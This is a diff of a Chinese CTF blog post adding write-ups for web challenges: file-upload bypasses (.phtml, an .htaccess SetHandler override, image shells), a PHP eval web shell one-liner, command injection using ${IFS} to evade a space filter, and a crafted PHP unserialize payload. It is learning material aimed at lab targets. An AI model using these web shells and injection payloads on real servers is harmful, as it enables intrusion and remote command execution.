@@ -24,7 +24,7 @@
 <meta property="og:description" content="include根据提示传一个file试试 &#x2F;?file&#x3D;1  123456789101112131415161718 &lt;?phpini_set(&quot;allow_url_include&quot;,&quot;on&quot;);header(&quot;Content-type: text&#x2F;html; charset&#x3D;utf-8&quot;);error_reporting(0);$">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-19T11:19:54.000Z">
-<meta property="article:modified_time" content="2023-08-20T04:30:55.498Z">
+<meta property="article:modified_time" content="2023-08-22T06:40:39.344Z">
 <meta property="article:author" content="amanokuya">
 <meta name="twitter:card" content="summary">
   
@@ -147,7 +147,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~3.02K
+                        ~5.89K
                     
                     字
                 </li>
@@ -158,7 +158,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1692505855498"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1692686439344"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -178,6 +178,20 @@
 <h3 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h3><p>用bp修改请求头<br><code>Please use &#39;WLLM&#39; browser!</code>   <code>User-Agent: WLLM</code><br><code>You can only read this at local!&lt;br&gt;Your address175.42.87.177</code>  &#x2F;&#x2F;只能在本地读取<br>xff <code>X-Forwarded-For:127.0.0.1</code> 获得flag</p>
 <h3 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
 <p><code>eval 把字符串作为PHP代码执行</code><br><code>PHP执行系统命令的有几个常用的函数,如：system函数、exec函数、popen函数、passthru、shell_exec函数等</code>  <a target="_blank" rel="noopener" href="https://forum.butian.net/share/1048">详见</a><br><code>?system(&#39;ls /&#39;)</code> <code>bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</code><br><code>?system(&#39;cat /flag&#39;)</code></p>
+<h3 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h3><p>上传.jpg，然后bp里面修改文件名为.php<br><code>&lt;?php @eval ($_GET[&#39;cmd&#39;]);?&gt;</code><br><code>./upload/cmd.php succesfully uploaded!</code><br>蚁剑怎么连不了？换一个<br><code>&lt;?php phpinfo();?&gt;</code><br>上传完直接访问路径   <code>/upload/cmd.php</code><br>F12查找<code>CTF&#123;</code> 获得<code>NSSCTF&#123;ec814e35-b715-40c2-8f72-76f8efb8d677&#125; </code></p>
+<h3 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h3><p><code>.php</code> <code>.php5</code> <code>.htaccess</code>这些都不行，利用<code>.phtml</code>上传成功,蚁剑还是连不了?<br><code>&lt;?php phpinfo();?&gt;</code> 后续步骤跟上题一样</p>
+<h3 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h3><p>估计蚁剑还是不行喵，跟上面步骤一样，这次是<code>.htaccess</code><br><code>.htaccess文件(或者分布式配置文件）,全称是Hypertext Access(超文本入口)。 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。 作为用户，所能使用的命令受到限制。</code><br>大概就是同文件夹的文件都会被解析成<code>.php</code>，<br><code>.htaccess</code>内容为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;  //shell.jpg根据实际情况调换</span><br></pre></td></tr></table></figure>
+
+<p>接下来上传一个图片马</p>
+<h3 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;admin&#x27;</span>]==1)    //通过 HTTP Cookies 方式传递给当前脚本的变量的数组。</span><br><span class="line">&#123;</span><br><span class="line">    include <span class="string">&quot;../next.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;小饼干最好吃啦！&quot;</span>;</span><br><span class="line">?&gt; 小饼干最好吃啦！</span><br></pre></td></tr></table></figure>
+<p>用<code>cookie editor</code>加个name&#x3D;admin,value&#x3D;1<br>刷新页面<code>rasalghul.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      die(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="variable">$ip</span>); //shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p><code>?url=ls;</code> 获得<code>* -la 1.php 1.txt 1.txt 1.txt a.out abc.txt aflllllaaaaaaggggggg flllllaaaaaaggggggg index.php rasalghul.php a.out abc.txt aflllllaaaaaaggggggg flllllaaaaaaggggggg index.php rasalghul.php 1.txt a.out abc.txt aflllllaaaaaaggggggg flllllaaaaaaggggggg index.php rasalghul.php 2.txt a.out abc.txt aflllllaaaaaaggggggg con f* flag flllllaaaaaaggggggg index.php la rasalghul.php test test.php test.txt</code> 怎么这么多喵？</p>
+<p><a target="_blank" rel="noopener" href="https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93">学一只空格绕过喵</a><br>用<code>$&#123;IFS&#125;</code>代替空格<br><code>?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg</code> 获得flag</p>
+<h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p>F12查看 <code>User-agent: *Disallow: 什么东西呢？</code> 搞不懂，先扫一下，扫出来<code>cl45s.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="variable">$admin</span>;</span><br><span class="line">    public <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;admin;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>序列化一下<code>对象类型:对象名长度:对象名:变量个数:&#123;变量类型:变量名长度:变量名;......;&#125;</code><br>获得payload <code>?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</code></p>
 </div>
         </div>
         
@@ -268,7 +282,7 @@
                     
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-08-20T04:30:55.498Z" itemprop="dateModified">最后编辑：2023-08-20</time>
+                    <time datetime="2023-08-22T06:40:39.344Z" itemprop="dateModified">最后编辑：2023-08-22</time>
                 </div>
             </div>
         </footer>
@@ -282,7 +296,7 @@
             
             
             <div class="nav-next clearfix">
-                <a title=" PHP伪协议" href="/2023/09/25/PHP伪协议/">下一篇 &gt;</a>
+                <a title=" PHP伪协议" href="/2023/08/20/PHP伪协议/">下一篇 &gt;</a>
             </div>
             
         </nav>
@@ -364,7 +378,7 @@
         
           
           
-            <a class="list-group-item" href="/2023/09/25/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><i class="fa  fa-book"></i> PHP伪协议</a>
+            <a class="list-group-item" href="/2023/08/20/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><i class="fa  fa-book"></i> PHP伪协议</a>
             
           
         
